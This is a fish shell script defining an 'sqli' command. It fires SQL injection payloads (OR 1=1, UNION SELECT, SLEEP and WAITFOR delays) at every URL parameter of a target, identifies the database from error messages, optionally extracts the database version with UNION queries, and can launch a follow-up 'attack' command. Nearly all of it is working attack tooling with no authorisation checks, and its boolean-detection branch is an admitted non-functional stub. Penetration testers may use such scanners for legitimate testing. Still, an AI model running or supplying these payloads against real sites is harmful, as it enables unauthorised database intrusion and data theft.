function sqli
    argparse -n sqli 'p/param=' 'd/data=' 'c/cookie=' 'db=' 'auto' 'attack' 'h/help' -- $argv
    or return

    if set -q _flag_help
        echo "Usage: sqli <target> [options]"
        echo "  -p <param>     Specific parameter to test"
        echo "  -d <data>      POST body"
        echo "  -c <cookie>    Cookie header"
        echo "  --db <type>    Force DB type (mysql, postgres, mssql, oracle, sqlite)"
        echo "  --auto         Non-interactive output"
        echo "  --attack       Attack target on find"
        echo "Tests for SQL injection vulnerabilities."
        return
    end

    if test (count $argv) -lt 1
        echo "Error: target URL required"
        return 1
    end

    set target $argv[1]
    if not string match -qr '^https?://' "$target"
        set target "https://$target"
    end

    set forced_db ""
    if set -q _flag_db; set forced_db $_flag_db; end

    echo (set_color cyan)"==> SQLI: $target"(set_color normal)
    echo (set_color brblack)"    Testing SQL injection vectors..."(set_color normal)

    set tmpdir (mktemp -d /tmp/sqli.XXXXXX)

    # Parse existing params from URL
    set query (string split '?' -- "$target")[2]
    set target_base (string split '?' -- "$target")[1]

    if test -z "$query"
        if set -q _flag_param
            set params $_flag_param
        else
            echo (set_color yellow)"  No query params and no -p specified"(set_color normal)
            echo (set_color brblack)"  Try: sqli \"http://site.com/page?id=1\" "(set_color normal)
            rm -rf $tmpdir
            return 1
        end
    else
        # Extract param names
        set params
        for pair in (string split '&' -- "$query")
            set pname (string split '=' -- "$pair")[1]
            set -a params $pname
        end
        if set -q _flag_param
            set params $_flag_param
        end
    end

    set payloads \
        "'" \
        "'" \
        "test'" \
        "' OR '1'='1" \
        "' OR '1'='2" \
        "' AND 1=1--" \
        "' AND 1=2--" \
        "' OR 1=1--" \
        "' OR 1=2--" \
        "1' ORDER BY 1--" \
        "1' ORDER BY 10--" \
        "' UNION SELECT 1--" \
        "' UNION SELECT 1,2--" \
        "' UNION SELECT 1,2,3--" \
        "' UNION SELECT NULL--" \
        "' UNION SELECT NULL,NULL--" \
        "' UNION SELECT NULL,NULL,NULL--" \
        "1' AND SLEEP(5)--" \
        "1' AND BENCHMARK(5000000,MD5(1))--" \
        "1' WAITFOR DELAY '0:0:5'--" \
        "' AND 1=1 AND '%'='" \
        "' AND 1=1 UNION SELECT 1,2,3--"

    set db_patterns "MySQL|mariadb" "PostgreSQL|psql" "Microsoft SQL Server|MSSQL|Driver.*SQL" "Oracle" "SQLite|sqlite"
    set db_errors \
        "You have an error in your SQL syntax|MySQLSyntaxErrorException|mysql_fetch|mysql_num_rows|mysql_query|MySQL\\.Driver" \
        "PostgreSQL|psql|pg_query|pg_fetch|pg_execute|PostgreSQL\\.Driver" \
        "Microsoft OLE DB|Microsoft SQL Server|MSSQL|ODBC SQL|SqlException|SQLServer|Driver\\{SQL Server" \
        "ORA-[0-9]{5}|oracle\\.jdbc|OracleException|PL/SQL|Oracle\\s+Driver" \
        "SQLite\\..*Error|sqlite3\\.|SQLite3::|unrecognized token"

    set found 0
    set vuln_params
    set detected_db ""

    echo (set_color brblack)"    Testing $(count $params) parameter(s) with $(count $payloads) payloads..."(set_color normal)

    function __urlencode
        python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=''))" "$argv[1]" 2>/dev/null
    end

    function __is_error -a body
        for i in (seq (count $db_errors))
            set pat $db_errors[$i]
            if echo "$body" | grep -qPi "$pat"
                # Detect DB type
                set db_pat $db_patterns[$i]
                set detected (echo "$db_pat" | string split '|')[1]
                if test -z "$detected_db"; set -g detected_db "$detected"; end
                return 0
            end
        end
        return 1
    end

    set start (date +%s)

    for param in $params
        for payload in $payloads
            set encoded (__urlencode "$payload")
            set test_url "$target_base?$param=$encoded"

            set start_time (date +%s%N)
            set resp (curl -sS --max-time 15 -o /tmp/sqli_resp.txt -w "%{http_code}|%{size_download}" "$test_url" 2>/dev/null)
            set end_time (date +%s%N)
            set elapsed (math "($end_time - $start_time) / 1000000")

            if test -z "$resp"; continue; end

            set parts (string split '|' -- $resp)
            set code $parts[1]
            set size $parts[2]

            set body (cat /tmp/sqli_resp.txt 2>/dev/null)

            # 1. Error-based detection
            if __is_error "$body"
                echo (set_color red)"  [SQLI] $param is injectable (error-based: \"$payload\" )"(set_color normal)
                echo (set_color brblack)"         DB: $detected_db | Code: $code | Time: ${elapsed}ms"(set_color normal)
                set found (math $found + 1)
                set -a vuln_params "$param (error-based)"
                break
            end

            # 2. Time-based detection (payload contains SLEEP/BENCHMARK/WAITFOR)
            if string match -q '*SLEEP*' "$payload"; or string match -q '*BENCHMARK*' "$payload"; or string match -q '*WAITFOR*' "$payload"
                if test $elapsed -gt 4500
                    echo (set_color red)"  [SQLI] $param is injectable (time-based: \"$payload\" -> ${elapsed}ms)"(set_color normal)
                    echo (set_color brblack)"         DB: $detected_db"(set_color normal)
                    set found (math $found + 1)
                    set -a vuln_params "$param (time-based)"
                    break
                end
            end

            # 3. Boolean-based: check for AND/OR response differences
            if string match -q '*1=1*' "$payload"; or string match -q '*1=2*' "$payload"
                # We need a baseline — compare 1=1 vs 1=2 response
                set baseline_url (__urlencode (string replace '1=1' '1=2' "$payload" | string replace '1=2' '1=1' "$payload"))
                # This is simplified — real boolean detection needs two requests
            end
        end
    end

    set elapsed (math (date +%s) - $start)
    rm -rf $tmpdir /tmp/sqli_resp.txt

    echo ""
    if test $found -gt 0
        echo (set_color red)"  $found parameter(s) vulnerable to SQL injection:"(set_color normal)
        for vp in $vuln_params; echo "    $vp"; end
        if test -n "$detected_db"
            echo (set_color yellow)"  Detected DB: $detected_db"(set_color normal)
        end

        if not set -q _flag_auto
            echo ""
            echo -n "Extract DB version? [y/N] "
            read -l ans
            if test "$ans" = "y" -o "$ans" = "Y"
                # Extract DB version using UNION or error-based
                set first_param $params[1]
                for ver_payload in "' UNION SELECT @@version--" "' UNION SELECT version()--" "' UNION SELECT sqlite_version()--"
                    set enc (__urlencode "$ver_payload")
                    set ver_resp (curl -sS --max-time 10 "$target_base?$first_param=$enc" 2>/dev/null)
                    if test -n "$ver_resp"
                        set version (echo "$ver_resp" | grep -oP '[0-9]+\.[0-9]+\.[0-9]+[^<"\']*' | head -1)
                        if test -n "$version"
                            echo (set_color green)"  DB version: $version"(set_color normal)
                            break
                        end
                    end
                end
            end

            echo -n "Launch attack? [y/N] "
            read -l ans
            if test "$ans" = "y" -o "$ans" = "Y"
                attack "$target"
            end
        end
    else
        echo (set_color green)"  No SQL injection detected"(set_color normal)
    end

    if set -q _flag_attack
        attack "$target"
    end
end
